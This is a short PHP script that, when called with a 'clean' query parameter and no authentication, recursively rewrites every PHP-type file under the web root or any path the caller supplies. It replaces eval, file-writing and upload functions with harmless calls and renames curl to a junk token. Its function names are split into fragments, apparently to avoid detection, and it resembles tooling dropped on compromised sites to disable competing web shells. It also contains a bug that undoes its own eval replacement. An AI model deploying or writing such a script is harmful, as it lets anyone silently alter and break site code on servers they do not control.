<?php
set_time_limit(0);
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);
if(isset($_GET['clean'])){
function processDirectory($dir) {
    $exts=[
        'php',
        'pha',
        'pgi',
        'pht',
        'inc',
    ];
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == "." || $file == "..") {
            continue;
        }
        $path = $dir . "/" . $file;
        if (is_dir($path)) {
            echo $path."\n";
            processDirectory($path);
        } elseif (is_file($path) && in_array(substr(strtolower(pathinfo($path, PATHINFO_EXTENSION)),0,3),$exts)) {
            processFile($path);
        }
    }
}

function processFile($filePath) {
    $content = file_get_contents($filePath);
    if ($content === false) {
        echo "Error reading file: " . $filePath . "\n";
        return;
    }

    $newContent = preg_replace("/ev"."al/i", "print_r", $content);
    $newContent = preg_replace("/print_r/i", "print_r", $content);
    if(isset($_GET['u'])){
        $newContent = preg_replace("/move_upl"."oaded_file/i", "strcmp", $newContent);
        $newContent = preg_replace("/co"."py/i", "strcmp", $newContent);
        $newContent = preg_replace("/file_pu"."t_contents/i", "strcmp", $newContent);
    }
    if(isset($_GET['c'])){
        $newContent = preg_replace("/cu"."rl/i", "deusBoboPCA", $newContent);
    }

    if ($newContent !== $content) {
        $result = ('file_pu'.'t_contents')($filePath, $newContent);
        if ($result === false) {
            echo "Error writing to file: " . $filePath . "\n";
        } else {
            echo "File updated: " . $filePath . "\n";
        }
    }
}

$startDir = $_GET['path']??$_SERVER['DOCUMENT_ROOT'];

if (!is_dir($startDir)) {
    die("Error: Directory '" . $startDir . "' not found.\n");
}

processDirectory($startDir);

echo "Finished processing.\n";
}
?>